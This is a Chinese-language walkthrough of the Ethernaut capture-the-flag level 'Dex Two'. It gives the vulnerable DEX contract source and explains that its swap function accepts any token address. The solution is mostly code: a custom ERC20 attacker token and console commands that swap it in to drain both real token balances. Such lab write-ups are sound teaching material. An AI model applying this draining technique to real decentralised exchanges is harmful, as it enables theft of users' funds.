### 第二十三题 Dex Two
### 题目
此级别将要求您以不同的方式破坏DexTwo，这是对前一题目进行了细微修改的Dex合约。您需要从DexTwo合约中提取token1和token2的所有余额才能通过此题。一开始您可以得到10个token1和token2。DEX合约仍然以每个代币100个开始。
### 提示
- 交换方法是如何修改的？
- 你可以在攻击中使用自定义代币合约吗？
- 获取新实例
### 源码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract DexTwo is Ownable {
    // 定义两个代币地址
    address public token1;
    address public token2;

    // 构造函数
    constructor() {}

    // 设置代币地址，只能由合约所有者调用
    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    // 添加流动性，只能由合约所有者调用
    function add_liquidity(address token_address, uint256 amount) public onlyOwner {
        // 从消息发送者转移指定数量的代币到合约地址
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    // 代币交换函数
    function swap(address from, address to, uint256 amount) public {
        // 确保消息发送者有足够的代币进行交换
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        // 计算交换数量
        uint256 swapAmount = getSwapAmount(from, to, amount);
        // 从消息发送者转移代币到合约地址
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        // 批准合约转移目标代币
        IERC20(to).approve(address(this), swapAmount);
        // 从合约地址转移目标代币到消息发送者
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    // 计算交换数量
    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
        // 返回按比例计算的交换数量
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    // 批准函数
    function approve(address spender, uint256 amount) public {
        // 批准两个代币的转移
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    }

    // 查询账户代币余额
    function balanceOf(address token, address account) public view returns (uint256) {
        // 返回指定账户的代币余额
        return IERC20(token).balanceOf(account);
    }
}

// 定义SwappableTokenTwo合约，继承ERC20合约
contract SwappableTokenTwo is ERC20 {
    // 定义去中心化交易所地址
    address private _dex;

    // 构造函数，初始化代币名称、符号和初始供应量
    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        // 铸造初始供应量的代币给消息发送者
        _mint(msg.sender, initialSupply);
        // 设置去中心化交易所地址
        _dex = dexInstance;
    }

    // 批准函数
    function approve(address owner, address spender, uint256 amount) public {
        // 确保批准者不是去中心化交易所地址
        require(owner != _dex, "InvalidApprover");
        // 调用父类的批准函数
        super._approve(owner, spender, amount);
    }
}
```

### 解题思路&过程
1. Dex two版本的题目跟上一题相比，去掉了require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");这一行，同时题目要求也变成要求我们让合约的2种token拥有数量都清0，可以再写一个token，然后将合约中的token，全部转移到我们的第三方token中即可。
2. token合约
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2.0/contracts/token/ERC20/IERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2.0/contracts/token/ERC20/ERC20.sol";

contract Mytoken is ERC20 {
    address public target;
  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }
}
```
3. 设置initialSupply为200，也就是让我们初始拥有200个恶意token。然后approve题目地址，并转给题目地址100个token，这样我们和题目合约初始情况下各拥有100个恶意合约的token。
4. 执行下面的代码
``
await contract.approve(player,1000)
await contract.approve(contract.address,1000)
token1 = (await contract.token1())
token2 = (await contract.token2())
// mytoken1和mytoken2分别对应2个部署的恶意合约的地址
mytoken1 = '0x3f4082b2CB234C9AA8a07aA155c490F30C3a1efC'
mytoken2 = '0xe1f59E568302978f628500096e87A2763F6d1D5f'
await contract.swap(mytoken1,token1,100)
await contract.swap(mytoken2,token2,100)``
6. 提交
